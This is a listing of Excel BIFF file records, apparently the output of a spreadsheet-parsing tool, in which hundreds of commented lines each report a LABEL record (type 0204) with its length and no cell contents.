' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     21 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
